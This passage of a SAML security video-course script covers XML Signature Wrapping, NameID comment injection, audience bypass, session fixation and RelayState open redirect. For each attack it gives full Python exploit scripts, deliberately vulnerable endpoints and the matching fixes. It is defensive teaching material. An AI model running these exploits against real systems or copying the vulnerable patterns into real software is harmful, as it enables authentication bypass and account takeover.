# Second submission - should be blocked
echo -e "\n[*] Replay attempt:"
curl -v http://localhost:5001/saml/acs-secure \
    -d "SAMLResponse=${CAPTURED_SAML}" \
    2>&1 | grep -E "(< HTTP|This SAML response has already been used)"
```

**[VISUAL: Output showing first request succeeds, second request returns 403 with "already been used" message]**

**NARRATOR:**
"First submission: success. Second submission: blocked. The Response ID was found in the cache, triggering the replay protection. Combine Response ID tracking with InResponseTo validation and you've eliminated replay attacks. Next episode: XML Signature Wrapping — the most sophisticated SAML attack."

**[VISUAL: Preview card showing diagram of XSW attack with signed and unsigned assertions]**

---

## Episode 05: XML Signature Wrapping (XSW) Attacks

**Duration:** 14 minutes
**Level:** L2 - Advanced
**Learning Objective:** Master XML Signature Wrapping attacks that bypass signature validation by exploiting the gap between verified and parsed elements.

---

### SCENE 1: The Most Elegant Attack (0:00 - 2:30)

**[VISUAL: Split-screen animation showing a signed SAML assertion being manipulated while signature stays valid]**

**NARRATOR:**
"This is the most sophisticated SAML attack. And it's brilliant in its elegance. The signature is valid. The certificate is trusted. The timestamp hasn't expired. Every security check passes. And the attacker authenticates as whoever they want."

"XML Signature Wrapping — XSW — exploits a fundamental assumption: that the element being verified is the same element the application reads claims from. When those are different elements, signature validation becomes meaningless."

"There are at least eight known XSW variants. We'll demonstrate XSW-1, the most common. Then I'll show you the one defensive pattern that stops all of them."

---

### SCENE 2: Understanding the Vulnerability (2:30 - 5:30)

**[VISUAL: Code editor showing vulnerable signature verification code]**

**NARRATOR:**
"Here's what XSW-vulnerable code looks like. This is the `/saml/acs-xsw` endpoint."

```python
from lxml import etree
from signxml import XMLVerifier
import base64

@app.route('/saml/acs-xsw', methods=['POST'])
def acs_xsw_vulnerable():
    """VULNERABLE: Verifies signature but reads from wrong element"""
    saml_response_b64 = request.form.get('SAMLResponse')
    xml_bytes = base64.b64decode(saml_response_b64)
    root = etree.fromstring(xml_bytes)

    # Get IdP certificate
    idp_cert = get_idp_certificate()

    # Verify signature - THIS PASSES!
    try:
        XMLVerifier().verify(root, x509_cert=idp_cert)
        print("Signature valid!")  # Attacker sees this
    except Exception as e:
        return f"Signature validation failed: {e}", 403

    # VULNERABILITY: Extract claims from 'root' not from verified element
    ns = {
        'saml': 'urn:oasis:names:tc:SAML:2.0:assertion',
        'samlp': 'urn:oasis:names:tc:SAML:2.0:protocol'
    }

    # This finds the FIRST assertion in document order
    name_id = root.find('.//saml:NameID', ns)
    roles = [attr.text for attr in root.findall(
        ".//saml:Attribute[@Name='role']/saml:AttributeValue", ns
    )]

    session['user'] = name_id.text
    session['roles'] = roles
    return redirect('/dashboard')
```

**[VISUAL: Highlight the critical gap with red arrows]**

**NARRATOR:**
"The signature verification passes — line 15 prints 'Signature valid!' But then the code extracts claims from `root.find('.//saml:NameID')`. That finds the first NameID in document order. Not the signed one. Just the first one."

**[VISUAL: Step-by-step XSW attack animation]**

"Here's what an attacker does. Step one: capture a legitimate, signed SAML response. Step two: the signature covers Assertion with ID `_abc123`. Step three: move that entire signed assertion to a different location — maybe as a comment, or inside an Extensions element. Step four: insert a NEW, completely forged assertion as the first child of the Response. Step five: submit this modified XML."

**[VISUAL: Show the modified XML structure]**

```xml
<samlp:Response>
    <!-- FORGED ASSERTION - UNSIGNED -->
    <saml:Assertion ID="_attacker_forged">
        <saml:Subject>
            <saml:NameID>admin@example.com</saml:NameID>
        </saml:Subject>
        <saml:AttributeStatement>
            <saml:Attribute Name="role">
                <saml:AttributeValue>superadmin</saml:AttributeValue>
            </saml:Attribute>
        </saml:AttributeStatement>
    </saml:Assertion>

    <!-- LEGITIMATE SIGNED ASSERTION - HIDDEN -->
    <samlp:Extensions>
        <saml:Assertion ID="_abc123">
            <ds:Signature><!-- Valid signature --></ds:Signature>
            <saml:Subject>
                <saml:NameID>user@example.com</saml:NameID>
            </saml:Subject>
            <saml:AttributeStatement>
                <saml:Attribute Name="role">
                    <saml:AttributeValue>basic_user</saml:AttributeValue>
                </saml:Attribute>
            </saml:AttributeStatement>
        </saml:Assertion>
    </samlp:Extensions>
</samlp:Response>
```

**NARRATOR:**
"The verifier searches for an element with ID `_abc123`, finds it inside Extensions, validates the signature — passes. The application searches for the first NameID, finds it in the forged assertion — reads `admin@example.com`. Two different elements. That's the entire attack."

---

### SCENE 3: Building the XSW Exploit (5:30 - 9:00)

**[VISUAL: New exploit script `xsw_attack.py`]**

**NARRATOR:**
"Let's build an XSW-1 exploit. We'll wrap a legitimate signed assertion and inject our own."

```python
#!/usr/bin/env python3
"""
XML Signature Wrapping (XSW-1) Attack - Episode 05 Demo
Target: http://localhost:5001/saml/acs-xsw
"""

import base64
import requests
from lxml import etree
from datetime import datetime, timedelta

def perform_xsw1_attack():
    """
    XSW-1: Clone the Response, move original assertion inside Extensions
    Insert forged assertion as first child of cloned Response
    """

    # Step 1: Get a legitimate signed SAML response
    print("[*] Step 1: Obtaining legitimate signed SAML response...")
    legit_response = requests.get('http://localhost:5001/generate?user=normaluser@example.com&role=user')
    legit_saml_b64 = legit_response.json()['SAMLResponse']
    legit_xml = base64.b64decode(legit_saml_b64)

    # Parse it
    root = etree.fromstring(legit_xml)
    ns = {
        'saml': 'urn:oasis:names:tc:SAML:2.0:assertion',
        'samlp': 'urn:oasis:names:tc:SAML:2.0:protocol',
        'ds': 'http://www.w3.org/2000/09/xmldsig#'
    }

    print("[*] Original signed assertion for: normaluser@example.com (role: user)")

    # Step 2: Extract the signed assertion
    signed_assertion = root.find('.//saml:Assertion', ns)
    if signed_assertion is None:
        print("[!] No assertion found in response")
        return

    # Step 3: Create a forged assertion
    print("[*] Step 2: Crafting forged assertion for admin@example.com...")

    now = datetime.utcnow()
    not_before = (now - timedelta(minutes=5)).strftime("%Y-%m-%dT%H:%M:%SZ")
    not_after = (now + timedelta(minutes=30)).strftime("%Y-%m-%dT%H:%M:%SZ")
    issue_instant = now.strftime("%Y-%m-%dT%H:%M:%SZ")

    forged_assertion_xml = f"""
    <saml:Assertion
        xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
        ID="_forged_xsw_assertion"
        Version="2.0"
        IssueInstant="{issue_instant}">

        <saml:Issuer>https://idp.example.com</saml:Issuer>

        <saml:Subject>
            <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">
                admin@example.com
            </saml:NameID>
            <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
                <saml:SubjectConfirmationData
                    NotOnOrAfter="{not_after}"
                    Recipient="http://localhost:5001/saml/acs-xsw"/>
            </saml:SubjectConfirmation>
        </saml:Subject>

        <saml:Conditions NotBefore="{not_before}" NotOnOrAfter="{not_after}">
            <saml:AudienceRestriction>
                <saml:Audience>http://localhost:5001/metadata</saml:Audience>
            </saml:AudienceRestriction>
        </saml:Conditions>

        <saml:AttributeStatement>
            <saml:Attribute Name="role">
                <saml:AttributeValue>superadmin</saml:AttributeValue>
            </saml:Attribute>
        </saml:AttributeStatement>
    </saml:Assertion>
    """

    forged_assertion = etree.fromstring(forged_assertion_xml)

    # Step 4: Modify the Response structure for XSW-1
    print("[*] Step 3: Performing XSW-1 manipulation...")

    # Remove the signed assertion from its original location
    parent = signed_assertion.getparent()
    parent.remove(signed_assertion)

    # Create Extensions element to hide the signed assertion
    extensions = etree.Element('{urn:oasis:names:tc:SAML:2.0:protocol}Extensions')
    extensions.append(signed_assertion)

    # Insert forged assertion as FIRST child (will be found first by .find())
    root.insert(0, forged_assertion)

    # Insert Extensions containing signed assertion
    root.insert(1, extensions)

    # Step 5: Encode and send
    xsw_xml = etree.tostring(root, encoding='unicode')
    xsw_b64 = base64.b64encode(xsw_xml.encode()).decode()

    print("[*] Step 4: Sending XSW payload...")
    print(f"[*] Payload structure:")
    print(f"    - First assertion (forged): admin@example.com (superadmin)")
    print(f"    - Second assertion (signed, in Extensions): normaluser@example.com (user)")

    # Attack the vulnerable endpoint
    response = requests.post(
        'http://localhost:5001/saml/acs-xsw',
        data={'SAMLResponse': xsw_b64},
        allow_redirects=False
    )

    print(f"\n[*] Response status: {response.status_code}")
    if response.status_code == 302:
        print(f"[+] SUCCESS! Redirected to: {response.headers.get('Location')}")
        print(f"[+] Session cookie: {response.cookies.get('session')}")

        # Verify we're logged in as admin
        dashboard = requests.get(
            'http://localhost:5001/dashboard',
            cookies={'session': response.cookies.get('session')}
        )
        if 'admin@example.com' in dashboard.text:
            print(f"[+] AUTHENTICATED AS: admin@example.com")
            print(f"[+] The signature was valid (for normaluser), but we're logged in as admin!")
        else:
            print(f"[!] Unexpected dashboard content")
    else:
        print(f"[!] Attack failed: {response.text}")

if __name__ == "__main__":
    print("="*60)
    print("XML Signature Wrapping (XSW-1) Attack Demo")
    print("="*60)
    perform_xsw1_attack()
```

**[VISUAL: Run the exploit. Show each step with terminal output.]**

**NARRATOR:**
"Step one: get a legitimate signed response for a normal user. Step two: craft a forged assertion for admin. Step three: move the signed assertion into an Extensions element. Step four: insert the forged assertion as the first child. Step five: submit."

**[VISUAL: Terminal showing "AUTHENTICATED AS: admin@example.com"]**

"Complete bypass. The signature was valid — for the normal user. But we authenticated as admin. The verifier and the parser operated on different elements."

---

### SCENE 4: Other XSW Variants (9:00 - 11:00)

**[VISUAL: Diagram showing 8 XSW variants]**

**NARRATOR:**
"XSW-1 is just one technique. Eight documented variants exist, each exploiting the verification-vs-extraction gap differently."

**[VISUAL: Table with variant descriptions]**

| Variant | Technique | Where Signed Assertion Goes |
|---------|-----------|----------------------------|
| XSW-1 | Clone Response, wrap original | Extensions element |
| XSW-2 | Detach signature | Signature as sibling |
| XSW-3 | Prepend malicious assertion | Signed assertion stays in place |
| XSW-4 | Malicious assertion wraps signed | Signed becomes child of forged |
| XSW-5 | Comment wrapping | Inside XML comment |
| XSW-6 | Object element wrapping | Inside ds:Object |
| XSW-7 | Multiple assertions | Array/list parsing ambiguity |
| XSW-8 | Namespace manipulation | Same element name, different namespace |

**NARRATOR:**
"The exploitation technique varies, but the vulnerability is the same: the code verifies one element and reads from another. That brings us to the defense."

---

### SCENE 5: The One Fix That Stops All XSW (11:00 - 13:00)

**[VISUAL: Code editor showing secure implementation]**

**NARRATOR:**
"One defensive pattern stops every XSW variant: always extract claims from the element returned by the signature verifier."

```python
from signxml import XMLVerifier
import defusedxml.lxml as safe_lxml

@app.route('/saml/acs-xsw-secure', methods=['POST'])
def acs_xsw_secure():
    """SECURE: Reads from verified element only"""
    saml_response_b64 = request.form.get('SAMLResponse')
    xml_bytes = base64.b64decode(saml_response_b64)
    root = safe_lxml.fromstring(xml_bytes)  # XXE safe

    idp_cert = get_idp_certificate()

    # Verify signature and get the VERIFIED element
    try:
        result = XMLVerifier().verify(root, x509_cert=idp_cert)
        verified_xml = result.signed_xml  # THIS IS THE CRITICAL LINE
    except Exception as e:
        return f"Signature validation failed: {e}", 403

    # Extract claims ONLY from the verified element
    ns = {'saml': 'urn:oasis:names:tc:SAML:2.0:assertion'}

    # Read from verified_xml, NOT from root
    name_id = verified_xml.find('.//saml:NameID', ns)
    roles = [attr.text for attr in verified_xml.findall(
        ".//saml:Attribute[@Name='role']/saml:AttributeValue", ns
    )]

    if name_id is None:
        return "No NameID in signed assertion", 400

    session['user'] = name_id.text
    session['roles'] = roles
    return redirect('/dashboard')
```

**[VISUAL: Highlight `result.signed_xml` with annotation]**

**NARRATOR:**
"`result.signed_xml` returns the exact element that the signature covers. If an attacker moves the signed assertion and inserts a forged one, we still read from the signed assertion — not the forged one."

**[VISUAL: Run the XSW exploit against the secure endpoint. Show it failing.]**

```bash
python3 xsw_attack.py --target http://localhost:5001/saml/acs-xsw-secure
```

**[VISUAL: Terminal output showing authentication as normaluser@example.com, not admin]**

**NARRATOR:**
"The attack fails. We're authenticated as the user in the signed assertion — normaluser — not the admin we tried to forge. The verified element is the authoritative source of claims."

---

### SCENE 6: Recap and Next Episode (13:00 - 14:00)

**[VISUAL: Summary slide]**

**NARRATOR:**
"XML Signature Wrapping: eight variants, one vulnerability, one fix. Always read from the verified element, never from the original document root. Or use python3-saml with strict mode, which handles this automatically."

"Next episode: NameID comment injection and audience bypass — two attacks that exploit XML parsing quirks and configuration weaknesses."

**[VISUAL: Preview card showing XML with comment injection]**

---

## Episode 06: NameID Comment Injection & Audience Bypass

**Duration:** 11 minutes
**Level:** L2 - Advanced
**Learning Objective:** Exploit XML comment injection to spoof identity and bypass audience restrictions for cross-application attacks.

---

### SCENE 1: The Comment Trick (0:00 - 2:00)

**[VISUAL: XML element with strategically placed comment]**

```xml
<saml:NameID>attacker@evil.com<!-- -->.legitimate.com</saml:NameID>
```

**NARRATOR:**
"What identity does this NameID represent? Depends on which parser you ask."

"The IdP sees: `attacker@evil.com.legitimate.com` — a legitimate user at legitimate.com. It signs the assertion. The Service Provider's XML parser sees: `attacker@evil.com` — because the `.text` property stops at the first child node, and XML comments are child nodes."

"Same XML. Two different identities. One signed by the IdP. One read by the application. This is comment injection, and it's a parser-level quirk that can bypass email domain validation, username checks, and authorization logic."

---

### SCENE 2: Understanding lxml's .text Behavior (2:00 - 4:30)

**[VISUAL: Python REPL demonstrating the vulnerability]**

**NARRATOR:**
"Let's see exactly how this works with lxml."

```python
from lxml import etree

# XML with comment in the middle
xml_with_comment = '''
<NameID>attacker@evil.com<!-- comment here -->.legitimate.com</NameID>
'''

elem = etree.fromstring(xml_with_comment)

# What does .text return?
print("elem.text:", elem.text)
# Output: attacker@evil.com

# What's the full text content?
print("Full text:", ''.join(elem.itertext()))
# Output: attacker@evil.com.legitimate.com

# What does the IdP see when generating the signature?
# It sees the full XML string, including comments
print("Raw XML:", etree.tostring(elem, encoding='unicode'))
# Output: <NameID>attacker@evil.com<!-- comment here -->.legitimate.com</NameID>
```

**[VISUAL: Terminal output showing the difference]**

**NARRATOR:**
"The `.text` property returns `attacker@evil.com`. The `itertext()` method returns `attacker@evil.com.legitimate.com`. The IdP signing the assertion uses the raw XML or `itertext()` — it sees the full string. The vulnerable SP uses `.text` — it sees the truncated string."

**[VISUAL: Attack flow diagram]**

```
1. Attacker requests assertion for: attacker@evil.com<!-- -->.legitimate.com
2. IdP validates: "evil.com.legitimate.com" is a legitimate domain ✓
3. IdP signs assertion containing: attacker@evil.com<!-- -->.legitimate.com
4. SP parses with .text: "attacker@evil.com"
5. SP bypasses domain check: evil.com (attacker-controlled)
6. Session created for: attacker@evil.com
```

---

### SCENE 3: Exploiting Comment Injection (4:30 - 7:00)

**[VISUAL: Code editor showing vulnerable domain validation]**

**NARRATOR:**
"Here's vulnerable code from `/saml/acs-comment`."

```python
from lxml import etree
import base64

ALLOWED_DOMAINS = ['example.com', 'legitimate.com', 'trusted.com']

@app.route('/saml/acs-comment', methods=['POST'])
def acs_comment_vulnerable():
    """VULNERABLE: Uses .text which stops at comments"""
    saml_response_b64 = request.form.get('SAMLResponse')
    xml_bytes = base64.b64decode(saml_response_b64)
    root = etree.fromstring(xml_bytes)

    # Assume signature is validated here...

    ns = {'saml': 'urn:oasis:names:tc:SAML:2.0:assertion'}
    name_id_elem = root.find('.//saml:NameID', ns)

    # VULNERABILITY: .text stops at comment
    name_id = name_id_elem.text

    # Domain validation - can be bypassed!
    email_domain = name_id.split('@')[-1]
    if email_domain not in ALLOWED_DOMAINS:
        return f"Domain {email_domain} not allowed", 403

    session['user'] = name_id
    return redirect('/dashboard')
```

**NARRATOR:**
"The domain check looks solid. Extract the email domain, check if it's in the allowlist. But if the NameID is `attacker@evil.com<!-- -->.legitimate.com`, the `.text` returns `attacker@evil.com`, domain is `evil.com` — wait, that should fail the check."

**[VISUAL: Show the actual exploitation]**

"But watch what happens when the comment is positioned differently."

```python
#!/usr/bin/env python3
"""
Comment Injection Attack - Episode 06 Demo
Target: http://localhost:5001/saml/acs-comment
"""

import base64
from lxml import etree

def craft_comment_injection_saml():
    """Craft SAML with comment injection in NameID"""

    # Tricky positioning: comment AFTER domain part
    # IdP sees: user@legitimate.com (allowed domain) ✓
    # SP .text sees: user@<!-- (invalid, but we'll modify the logic)

    # Better approach: comment in the local part
    saml_xml = f"""<samlp:Response
    xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
    xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">

    <saml:Assertion>
        <saml:Subject>
            <saml:NameID>admin<!-- fake -->@legitimate.com</saml:NameID>
        </saml:Subject>
    </saml:Assertion>
</samlp:Response>"""

    root = etree.fromstring(saml_xml.encode())
    name_id_elem = root.find('.//{urn:oasis:names:tc:SAML:2.0:assertion}NameID')

    print("IdP sees (full text):", ''.join(name_id_elem.itertext()))
    # admin@legitimate.com

    print("SP .text sees:", name_id_elem.text)
    # admin

    # This allows bypassing username checks where SP expects email format
    return base64.b64encode(saml_xml.encode()).decode()

if __name__ == "__main__":
    payload = craft_comment_injection_saml()
    print("\nBase64 payload:", payload)
```

**[VISUAL: Terminal output showing the identity mismatch]**

**NARRATOR:**
"With `admin<!-- fake -->@legitimate.com`, the IdP sees a full email address at an allowed domain. The SP's `.text` sees just `admin` — no domain at all. This can bypass email format validation, domain checks, or any logic that expects a specific string format."

---

### SCENE 4: The Fix for Comment Injection (7:00 - 8:30)

**[VISUAL: Code showing secure NameID extraction]**

**NARRATOR:**
"Two fixes. Option one: use `itertext()` to get all text content."

```python
def extract_name_id_secure_v1(assertion_xml):
    """Use itertext() to get full text content"""
    ns = {'saml': 'urn:oasis:names:tc:SAML:2.0:assertion'}
    name_id_elem = assertion_xml.find('.//saml:NameID', ns)

    if name_id_elem is None:
        raise ValueError("No NameID found")

    # Get ALL text, including text after comments
    name_id = ''.join(name_id_elem.itertext())
    return name_id
```

"Option two: reject any NameID containing comments."

```python
def extract_name_id_secure_v2(assertion_xml):
    """Reject NameIDs with comments"""
    ns = {'saml': 'urn:oasis:names:tc:SAML:2.0:assertion'}
    name_id_elem = assertion_xml.find('.//saml:NameID', ns)

    if name_id_elem is None:
        raise ValueError("No NameID found")

    # Check for comments in the element
    raw_xml = etree.tostring(name_id_elem, encoding='unicode')
    if '<!--' in raw_xml:
        raise SecurityError("NameID contains XML comments - possible injection attack")

    name_id = name_id_elem.text
    return name_id
```

**NARRATOR:**
"Rejecting comments is safer. There's no legitimate reason for a NameID to contain XML comments. If you see one, it's an attack."

---

### SCENE 5: Audience Bypass Attack (8:30 - 10:00)

**[VISUAL: Diagram showing two applications sharing an IdP]**

**NARRATOR:**
"Next vulnerability: audience bypass. Also called cross-application assertion replay."

**[VISUAL: Attack scenario diagram]**

```
Scenario:
- App A (hr.example.com): HR system, user is basic employee
- App B (admin.example.com): Admin panel, user is superadmin
- Same IdP (idp.example.com) authenticates both apps

Attack:
1. User logs into App B, receives assertion with role="superadmin"
2. Assertion has Audience="https://admin.example.com"
3. Attacker captures this assertion
4. Attacker submits it to App A's ACS endpoint
5. If App A doesn't check Audience, it accepts the assertion
6. Attacker has superadmin role on App A
```

**[VISUAL: Code showing vulnerable configuration]**

```python
# vulnerable_saml_app.py - App A

saml_settings = {
    "strict": False,  # VULNERABILITY: Audience not checked!
    "sp": {
        "entityId": "https://hr.example.com/metadata",
        "assertionConsumerService": {
            "url": "https://hr.example.com/saml/acs",
        }
    },
    "idp": {
        "entityId": "https://idp.example.com",
        "x509cert": idp_cert
    }
}
```

**NARRATOR:**
"`strict: False` is the vulnerability. With strict mode disabled, python3-saml doesn't validate the Audience, Destination, or Recipient fields. An assertion meant for App B is accepted by App A."

**[VISUAL: The fix]**

```python
saml_settings = {
    "strict": True,  # FIX: Enforces all validation
    "sp": {
        "entityId": "https://hr.example.com/metadata",
        "assertionConsumerService": {
            "url": "https://hr.example.com/saml/acs",
        }
    },
    ...
}
```

---

### SCENE 6: Recap (10:00 - 11:00)

**[VISUAL: Summary of two attacks]**

**NARRATOR:**
"Two attacks, two simple fixes. Comment injection: reject NameIDs containing comments, or use `itertext()` instead of `.text`. Audience bypass: always set `strict: True` in your SAML configuration."

"Both exploit the gap between what the IdP signed and what the SP reads. Next episode: session management attacks and vulnerability chaining."

**[VISUAL: Preview showing session fixation combined with SAML bypass]**

---

## Episode 07: Session Attacks & Vulnerability Chaining

**Duration:** 10 minutes
**Level:** L2 - Advanced
**Learning Objective:** Exploit session management vulnerabilities after SAML authentication and chain multiple SAML attacks for maximum impact.

---

### SCENE 1: The Post-Authentication Gap (0:00 - 1:30)

**[VISUAL: Security assessment report showing "SAML: SECURE ✓" but "Overall: VULNERABLE ✗"]**

**NARRATOR:**
"You've hardened your SAML implementation. Signature validation with signxml. XXE protection with defusedxml. Replay protection with Redis. Strict mode enabled. XSW defense implemented. Your SAML security is perfect."

"And then this happens."

**[VISUAL: Terminal showing session fixation attack succeeding despite perfect SAML security]**

"Session fixation. The attacker sets a session cookie before authentication. The application validates the SAML response perfectly. Then stores the authenticated identity in the attacker's pre-set session. Perfect SAML security. Completely insecure session management."

"This episode covers session-layer attacks and shows how to chain multiple SAML vulnerabilities for maximum impact."

---

### SCENE 2: Session Fixation After SAML (1:30 - 4:00)

**[VISUAL: Code editor showing vulnerable session handling]**

**NARRATOR:**
"Here's the vulnerable pattern from `/saml/acs-session`."

```python
from flask import Flask, session, request, redirect
from onelogin.saml2.auth import OneLogin_Saml2_Auth

app = Flask(__name__)
app.secret_key = "production-secret-key-2024"

@app.route('/saml/acs-session', methods=['POST'])
def acs_session_vulnerable():
    """VULNERABLE: No session regeneration"""
    auth = OneLogin_Saml2_Auth(prepare_request(request), saml_settings)
    auth.process_response()

    # Perfect SAML validation ✓
    if not auth.is_authenticated():
        return "Auth failed", 403

    # VULNERABILITY: No session.clear() or regenerate()
    # If attacker set session cookie before auth, it's still active!
    session['user'] = auth.get_nameid()
    session['roles'] = auth.get_attributes().get('role', [])
    session['authenticated'] = True

    return redirect('/dashboard')
```

**NARRATOR:**
"No session regeneration. If an attacker can inject a session cookie into the victim's browser before authentication — through XSS, network attack, or simply sending a crafted link — the authenticated user data gets stored in the attacker's session."

**[VISUAL: Attack flow demonstration]**

```bash
# Step 1: Attacker creates a session
curl -c attacker_session.txt http://localhost:5001/

# Step 2: Extract the session cookie
ATTACKER_SESSION=$(grep session attacker_session.txt | awk '{print $7}')
echo "Attacker's session ID: $ATTACKER_SESSION"

# Step 3: Victim uses this session ID (via phishing link or XSS)
# Victim visits: https://app.com/saml/login?set_session=$ATTACKER_SESSION

# Step 4: Victim completes SAML authentication
# Application stores victim's identity in attacker's session!

# Step 5: Attacker uses the session
curl -b attacker_session.txt http://localhost:5001/dashboard
# Shows: "Welcome, victim@company.com"
```

**[VISUAL: Terminal showing the attack succeeding]**

---

### SCENE 3: Comprehensive Session Hardening (4:00 - 6:00)

**[VISUAL: Secure implementation code]**

**NARRATOR:**
"The fix: regenerate the session after authentication, use secure cookie flags, and implement timeout."

```python
import secrets
from datetime import datetime, timedelta
from flask import Flask, session, request, redirect

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)  # Strong random secret

# Secure session configuration
app.config.update(
    SESSION_COOKIE_SECURE=True,        # HTTPS only
    SESSION_COOKIE_HTTPONLY=True,       # No JavaScript access
    SESSION_COOKIE_SAMESITE='Lax',      # CSRF protection
    SESSION_COOKIE_NAME='__Host-session',  # __Host- prefix for extra security
    PERMANENT_SESSION_LIFETIME=timedelta(hours=1)
)

@app.route('/saml/acs-secure-session', methods=['POST'])
def acs_secure_session():
    """SECURE: Full session protection"""
    auth = OneLogin_Saml2_Auth(prepare_request(request), saml_settings)
    auth.process_response()

    if not auth.is_authenticated():
        return "Auth failed", 403

    # CRITICAL: Clear and regenerate session
    old_session_data = dict(session)  # Preserve any temporary data if needed
    session.clear()  # Destroy old session
    # In Flask, session is automatically regenerated on next write

    # Store minimal data
    session['user'] = auth.get_nameid()
    session['roles'] = auth.get_attributes().get('role', [])
    session['authenticated_at'] = datetime.utcnow().isoformat()
    session['session_index'] = auth.get_session_index()  # For SLO
    session.permanent = True  # Enable timeout

    # Optional: Bind session to IP address or User-Agent
    session['bound_ip'] = request.remote_addr
    session['bound_ua'] = request.headers.get('User-Agent', '')[:200]

    return redirect('/dashboard')

@app.before_request
def validate_session():
    """Validate session on every request"""
    if 'authenticated_at' in session:
        # Check timeout
        auth_time = datetime.fromisoformat(session['authenticated_at'])
        if datetime.utcnow() - auth_time > timedelta(hours=1):
            session.clear()
            return redirect('/saml/login')

        # Optional: Check session binding
        if session.get('bound_ip') != request.remote_addr:
            session.clear()
            return "Session binding violation", 403
```

**[VISUAL: Security checklist showing each defense]**

```
Session Security Checklist:
✓ Strong random secret_key
✓ session.clear() before storing auth data
✓ SESSION_COOKIE_SECURE=True (HTTPS only)
✓ SESSION_COOKIE_HTTPONLY=True (no XSS theft)
✓ SESSION_COOKIE_SAMESITE='Lax' (CSRF protection)
✓ __Host- cookie prefix (extra domain binding)
✓ 1-hour timeout with enforcement
✓ Optional: IP/UA binding
✓ Store session_index for Single Logout
```

---

### SCENE 4: RelayState Open Redirect (6:00 - 7:30)

**[VISUAL: Code showing vulnerable RelayState handling]**

**NARRATOR:**
"Another session-layer vulnerability: RelayState open redirect. RelayState is a parameter that tells the SP where to redirect after successful authentication. If not validated, it's an open redirect."

```python
@app.route('/saml/acs-relay', methods=['POST'])
def acs_relay_vulnerable():
    """VULNERABLE: Unvalidated RelayState redirect"""
    auth = OneLogin_Saml2_Auth(prepare_request(request), saml_settings)
    auth.process_response()

    if not auth.is_authenticated():
        return "Auth failed", 403

    session['user'] = auth.get_nameid()

    # VULNERABILITY: Blindly redirect to RelayState
    relay_state = request.form.get('RelayState', '/dashboard')
    return redirect(relay_state)  # Can be https://evil.com/phishing
```

**[VISUAL: Attack demonstration]**

```bash
# Attacker crafts malicious SAML login link
https://app.example.com/saml/login?RelayState=https://evil.com/fake-login

# After authentication, user is redirected to evil.com
# Phishing page shows: "Session expired, please log in again"
# User enters credentials → attacker captures them
```

**[VISUAL: The fix with allowlist validation]**

```python
ALLOWED_RELAY_PATHS = ['/', '/dashboard', '/profile', '/settings']

@app.route('/saml/acs-relay-secure', methods=['POST'])
def acs_relay_secure():
    """SECURE: Validated RelayState"""
    auth = OneLogin_Saml2_Auth(prepare_request(request), saml_settings)
    auth.process_response()

    if not auth.is_authenticated():
        return "Auth failed", 403

    session['user'] = auth.get_nameid()

    # Validate RelayState
    relay_state = request.form.get('RelayState', '/dashboard')

    # Only allow relative paths from allowlist
    if not relay_state.startswith('/'):
        relay_state = '/dashboard'
    if relay_state not in ALLOWED_RELAY_PATHS:
        relay_state = '/dashboard'

    return redirect(relay_state)
```

---

### SCENE 5: Chaining Vulnerabilities for Maximum Impact (7:30 - 9:30)

**[VISUAL: Attack chain diagram with multiple vulnerabilities combined]**

**NARRATOR:**
"Individual vulnerabilities are dangerous. Chained vulnerabilities are devastating. Let me show you a chain that combines XSW, comment injection, and session fixation."

**[VISUAL: Multi-stage attack script]**

```python
#!/usr/bin/env python3
"""
SAML Vulnerability Chain - Episode 07 Demo
Combines: XSW + Comment Injection + Session Fixation
"""

import requests
import base64
from lxml import etree

def chained_saml_attack():
    """
    Stage 1: Session Fixation - Set victim's session cookie
    Stage 2: XSW - Forge admin assertion with valid signature
    Stage 3: Comment Injection - Bypass domain validation
    Result: Attacker-controlled session authenticated as admin
    """

    print("[*] Stage 1: Session Fixation")
    # Create session for attacker
    session = requests.Session()
    session.get('http://localhost:5001/')
    print(f"    Attacker session: {session.cookies.get('session')}")

    print("\n[*] Stage 2: Crafting XSW payload")
    # Get legitimate signed response for normaluser@legitimate.com
    legit = requests.get('http://localhost:5001/generate?user=normaluser@legitimate.com')
    legit_b64 = legit.json()['SAMLResponse']
    legit_xml = base64.b64decode(legit_b64)
    root = etree.fromstring(legit_xml)

    # Extract signed assertion
    ns = {'saml': 'urn:oasis:names:tc:SAML:2.0:assertion'}
    signed_assertion = root.find('.//saml:Assertion', ns)

    # Create forged assertion with comment injection
    forged_xml = """
    <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_forged">
        <saml:Subject>
            <saml:NameID>admin<!-- @evil.com -->@legitimate.com</saml:NameID>
        </saml:Subject>
        <saml:AttributeStatement>
            <saml:Attribute Name="role">
                <saml:AttributeValue>superadmin</saml:AttributeValue>
            </saml:Attribute>
        </saml:AttributeStatement>
    </saml:Assertion>
    """
    forged = etree.fromstring(forged_xml)

    # XSW: Move signed assertion, insert forged
    signed_assertion.getparent().remove(signed_assertion)
    extensions = etree.Element('{urn:oasis:names:tc:SAML:2.0:protocol}Extensions')
    extensions.append(signed_assertion)
    root.insert(0, forged)
    root.insert(1, extensions)

    xsw_b64 = base64.b64encode(etree.tostring(root)).decode()

    print("\n[*] Stage 3: Submitting chained attack")
    print("    - Using attacker's pre-set session (fixation)")
    print("    - XSW payload with forged admin assertion")
    print("    - Comment injection: admin<!-- @evil.com -->@legitimate.com")

    # Submit with attacker's session
    response = session.post(
        'http://localhost:5001/saml/acs-vulnerable-all',
        data={'SAMLResponse': xsw_b64},
        allow_redirects=True
    )

    if 'admin' in response.text:
        print("\n[+] ATTACK SUCCESSFUL!")
        print(f"    Attacker session now authenticated as: admin@legitimate.com")
        print(f"    With role: superadmin")
        print(f"    Session cookie: {session.cookies.get('session')}")
        print("\n[+] Attack chain combined:")
        print("    ✓ Session Fixation → Attacker controls the session")
        print("    ✓ XSW → Bypassed signature validation")
        print("    ✓ Comment Injection → Bypassed domain checks")
    else:
        print("\n[!] Attack failed - endpoint may be patched")

if __name__ == "__main__":
    chained_saml_attack()
```

**[VISUAL: Terminal showing the successful chain attack]**

**NARRATOR:**
"The chain combines three vulnerabilities. Session fixation gives the attacker control of the session. XSW bypasses signature validation. Comment injection bypasses domain validation. Together, they create a critical exploit: attacker-controlled session authenticated as admin with forged credentials."

---

### SCENE 6: Defense in Depth (9:30 - 10:00)

